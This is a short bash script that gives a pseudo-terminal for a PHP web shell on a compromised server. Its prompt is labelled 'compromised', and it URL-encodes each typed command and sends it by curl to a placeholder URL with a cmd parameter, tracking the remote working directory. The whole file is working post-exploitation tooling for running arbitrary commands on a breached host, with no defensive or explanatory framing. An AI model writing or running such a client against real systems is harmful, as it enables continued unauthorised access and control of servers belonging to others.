#!/bin/bash

urlencode() {
    # urlencode <string>

    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:$i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf '%s' "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LC_COLLATE=$old_lc_collate
}
green='\033[0;32m'
blue='\033[0;34m'
NC='\033[0m'

curr_pwd='[inital_path]'
while true ; do
	# read -p ">> " cmd
	while IFS= read -e -p "`printf \"${green}compromised${NC}:${blue}$curr_pwd${NC}\$ \"`" cmd; do
         history -s "$cmd"
	
    if [[ $cmd == 'clear' ]]; then 
        clear 
    
    else
        cmd='cd '$curr_pwd';'"$cmd""; pwd"
        cmd=$(urlencode "$cmd")
        curl -s http://[ip]/[path_on_server]/[file_name].php\?cmd\=$cmd | tee curr_pwd.log | head -n -1
        curr_pwd=`tail -n 1 curr_pwd.log`
    fi
	done
done 